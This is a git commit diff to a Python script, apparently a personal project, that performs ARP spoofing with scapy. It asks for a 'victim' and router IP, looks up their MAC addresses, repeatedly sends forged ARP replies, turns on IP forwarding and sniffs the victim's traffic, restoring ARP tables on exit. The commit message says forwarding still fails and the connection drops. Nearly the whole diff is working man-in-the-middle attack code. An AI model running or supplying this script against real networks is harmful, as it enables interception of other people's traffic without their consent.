db035cbda1be9e2642196f1ca3b2fe4a9223a773
Aidan Fray <afray@hotmail.co.uk>
2017-11-14 21:36:41 +0000

    Changes; -Redesigned the ARP Spoofing so the MAC address is only obtained once instead of every loop -ARP spoofing works but there're are still issues with the forwarding of packets and internet connection is lost when the spoofing begins

--- PacketCapture/ArpSpoofing.py
+++ PacketCapture/ArpSpoofing.py
@@ -3,7 +3,7 @@ import sys
 from scapy.all import *
 from scapy.layers.l2 import arping
 
-interface = "wlp3s0\n"
+interface = "wlp3s0"
 victimIP = input("victim: \n")
 routerIP = input("router: \n")
 
@@ -14,9 +14,32 @@ def MACsnag(IP):
         return r[Ether].src
 
 
+victimMAC = None
+routerMAC = None
+
+
+def MAC():
+    loop = True
+    while loop:
+        global victimMAC
+        global routerMAC
+        victimMAC = MACsnag(victimIP)
+        routerMAC = MACsnag(routerIP)
+
+        print("\nMAC ADDRESS OBTAINED")
+        print(victimMAC)
+        print(routerMAC, '\n')
+
+        if victimMAC is not None and routerMAC is not None:
+            loop = False
+            print("[*] MAC Addresses obtain sucessfully!")
+        else:
+            print("[!] Error obtaining MAC Addresses, trying again!")
+
+
 def spoof(routerIP, victimIP):
-    victimMAC = MACsnag(victimIP)
-    routerMAC = MACsnag(routerIP)
+    print("Router mac: \'", routerMAC, '\'')
+    print("Victim mac: \'", victimMAC, '\'')
 
     # Sends the arp replies
     #
@@ -27,10 +50,6 @@ def spoof(routerIP, victimIP):
 
 
 def restore(routerIP, victimIP):
-    # TODO: This can be simplified to just load in the values saved before the spoof
-    victimMAC = MACsnag(victimIP)
-    routerMAC = MACsnag(routerIP)
-
     # Restores the original config
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=4)
@@ -39,31 +58,38 @@ def restore(routerIP, victimIP):
 def sniffer():
     pkts = sniff(iface=interface, count=10, prn=lambda
         x: x.sprintf(" "
-                     "Source: %IP.src% : %Ether.src%,\n "
-                     "%Raw.load% \n"
-                     "\n "
-                     "Reciever: %IP.dst% \n "
-                     "=================================================================\n"
+                        "=================================================================\n"
+                        "Source: %IP.src% : %Ether.src%,\n "
+                        "Reciever: %IP.dst% \n "
+                        "=================================================================\n"
                      ))
-    wrpcap("temp.pcap", pkts)
 
 
+# TODO: Not sure packets are being forwarded correctly?
 def set_ip_forward(state):
     if state is True:
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        #os.system("sysctl net.ipv4.conf.wlp3s0.forwarding=1")
+        os.system("sysctl net.ipv4.ip_forward=1")
+
     else:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        #os.system("sysctl net.ipv4.conf.wlp3s0.forwarding=0")
+        os.system("sysctl net.ipv4.ip_forward=0")
+
 
 
 def run():
     set_ip_forward(True)
+    spoof(routerIP, victimIP)
 
     while True:
         try:
             spoof(routerIP, victimIP)
             time.sleep(1)
-            sniffer() # TODO: Just here for debug
+            #sniffer() # TODO: Just here for debug
         except KeyboardInterrupt:
             restore(routerIP, victimIP)
             set_ip_forward(False)
             sys.exit(0)
+
+MAC()
+run()
